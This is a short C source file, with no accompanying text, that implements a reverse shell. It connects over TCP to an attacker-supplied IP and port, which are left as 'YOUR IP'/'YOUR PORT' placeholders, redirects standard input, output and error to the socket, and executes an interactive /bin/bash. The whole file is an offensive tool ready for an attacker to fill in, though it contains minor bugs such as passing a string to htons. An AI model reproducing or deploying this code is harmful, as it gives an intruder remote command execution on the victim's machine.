#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define SERV_PORT "YOUR PORT"
#define SERV_HOST "YOUR IP"

#define SHELLC ""
struct sockaddr_in net_setup;

static void client(){
	char *arg[]={"-i",NULL};
	net_setup.sin_addr.s_addr=inet_addr(SERV_HOST);
	net_setup.sin_port=htons(SERV_PORT);
	net_setup.sin_family=AF_INET;
	const int s=socket(
			AF_INET,
			SOCK_STREAM,
			IPPROTO_TCP
	);
	if (s <= 0)
		exit(1);

	if (connect(s,(struct sockaddr *)&net_setup,sizeof(net_setup))<=-1){
		printf("tidak bisa terkoneksi\n");
		exit(1);
	}else{
        while (1){
			dup2(
					s,
					STDIN_FILENO
			);
			dup2(
					s,
					STDOUT_FILENO
			);
			dup2(
					s,
					STDERR_FILENO
			);
	        execve(
		    	"/bin/bash",
			    arg,
			    NULL
	        );
	    }
	}
}

int main(int argc,char *argv[]){
	client();
	return 1-1;
}
